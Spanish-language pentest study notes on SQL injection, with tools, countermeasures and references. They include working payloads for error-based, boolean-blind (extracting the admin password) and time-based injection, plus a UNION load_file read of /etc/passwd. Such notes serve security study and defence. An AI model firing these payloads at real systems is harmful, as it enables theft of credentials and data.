# Análisis de Vulnerabilidades: SQL Injection (SQLi)

## Descripción
La inyección SQL (SQLi) ocurre cuando una aplicación web inserta datos de entrada no confiables directamente en una consulta SQL sin la debida sanitización o parametrización. Según *The Web Application Hacker's Handbook*, la explotación exitosa puede permitir la lectura de bases de datos completas, modificación de datos (U/I/D) y, en configuraciones débiles (ej. `xp_cmdshell` en MSSQL), la ejecución de comandos en el sistema operativo.

## Clasificación
- **Fase**: Análisis de Vulnerabilidades
- **MITRE ATT&CK**: [T1190](https://attack.mitre.org/techniques/T1190/) (Exploit Public-Facing Application)
- **Plataforma**: Web
- **Dificultad**: Avanzada

## Herramientas
- **SQLMap** — Estándar de la industria para automatizar la detección y explotación.
- **Burp Suite (Repeater/Intruder)** — Para validación manual y análisis de respuestas.
- **dbdat** — Herramienta de auditoría para bases de datos (Oracle, MSSQL).
- **SecLists** — Listas de payloads para fuzzing de parámetros.

## Comandos / Ejemplos

### 1. Inyección Basada en Error (Error-based)
Útil cuando el servidor devuelve mensajes de error detallados de la DB.
- **Payload**: `' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 0,1), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`

### 2. Inyección Ciega Basada en Booleano (Boolean-blind)
Cuando la aplicación solo cambia su respuesta (ej. "Bienvenido" vs "Login fallido").
- **Test**: `?id=1' AND 1=1--` (Verdadero) vs `?id=1' AND 1=2--` (Falso).
- **Inferencia**: `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--`

### 3. Inyección Ciega Basada en Tiempo (Time-blind)
Cuando la respuesta es idéntica, se induce un retraso en la base de datos.
- **MySQL**: `?id=1' AND IF(1=1, SLEEP(5), 0)--`
- **PostgreSQL**: `?id=1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

### 4. Lectura de Archivos Locales (load_file)
Si el usuario de la DB tiene permisos de lectura y la variable `secure_file_priv` es nula:
- **MySQL**: `' UNION SELECT 1, load_file('/etc/passwd'), 3, 4--`

## Contramedidas
- **Consultas Preparadas (Sentencias Parametrizadas)**: Única defensa 100% efectiva (ej. `PDO` en PHP, `PreparedStatement` en Java).
- **Principio de Mínimo Privilegio**: La cuenta de la DB de la web no debe ser `root` ni `sa`.
- **WAF (Web Application Firewall)**: Para detectar y bloquear patrones de inyección conocidos (defensa en profundidad).

## Referencias
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). Wiley.
- Rahalkar, S. (2017). *Metasploit Penetration Testing Cookbook* (3rd ed.). Packt Publishing.
- Notas del proyecto: notas-md/HNotes/HNotes/Burp Suite Labs/SQL Injection.md
- OWASP Foundation. (2021). *SQL Injection Prevention Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
